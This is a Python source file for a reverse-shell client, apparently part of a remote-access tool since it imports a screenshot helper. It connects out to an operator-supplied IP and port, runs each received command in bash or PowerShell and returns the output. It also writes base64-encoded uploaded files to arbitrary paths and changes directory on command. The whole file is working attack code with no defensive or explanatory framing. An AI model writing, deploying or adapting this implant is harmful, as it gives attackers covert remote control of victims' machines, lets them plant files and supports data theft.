#!/usr/bin/python3
import os
import sys
import socket
import base64
import subprocess
from lib.screenshot import screenshot



class Client:

    def __init__(self,ip: str,port: int,byte_size=1024) -> None:
        self.ip = ip
        self.port = port
        self.byte_size = byte_size
        self.shell = "powershell" if os.name == "nt" else "bash"
        
        self.client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.client.connect((self.ip,self.port))

    def ReciveCommand(self):
        return self.client.recv(self.byte_size).decode()
    
    def ExecuteCommand(self,command: str) -> None:
        try:
            result = subprocess.run([self.shell,"-c",command],text=True,capture_output=True,timeout=10)
        except Exception as e:
            self.client.send(str(e).encode())
            return None
        if result.stdout:
            self.client.send(result.stdout.encode())
        elif result.stderr:
            self.client.send(result.stderr.encode())
        else:
            self.client.send("The command did not produce any output".encode())

    def Main(self) -> None:
        while True:
            command = self.ReciveCommand()
            
            if command.lower() == "exit":
                self.client.close()
                print("Exiting...")
                sys.exit()



            if command.startswith('upload'):
                payload = command.split(':')
                print("Payload:",payload)
                size = int(payload[1])
                path = payload[2]
                self.client.send("ok".encode())
                content = self.client.recv(size).decode()
                try:
                    with open(path,'wb') as f:
                        content = base64.b64decode(content.encode())
                        f.write(content)
                        self.client.send("file uploaded succesfully".encode())
                except Exception as err:
                    print(err)
                    self.client.send(str(err).encode())
            if command.startswith("cd"):
                payload = command.split(' ',1)
                if len(payload) != 2:
                    self.client.send('Invlaid argumant!'.encode())
                    continue
                try:
                    os.chdir(payload[1].strip())
                    self.client.send(f'{os.getcwd()}'.encode())
                except Exception as err:
                    self.client.send(str(err).encode())
            else:
                self.ExecuteCommand(command)
                print(f"command runned:{command}")

        self.client.close()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: ./{sys.argv[0]} <ip> <port> <byte-size (default is 1024)>")
        sys.exit()
    ip = sys.argv[1]
    port = int(sys.argv[2])
    byte_size = int(sys.argv[3]) if len(sys.argv) == 4 else 1024
    client = Client(ip,port,byte_size=byte_size)
    client.Main()
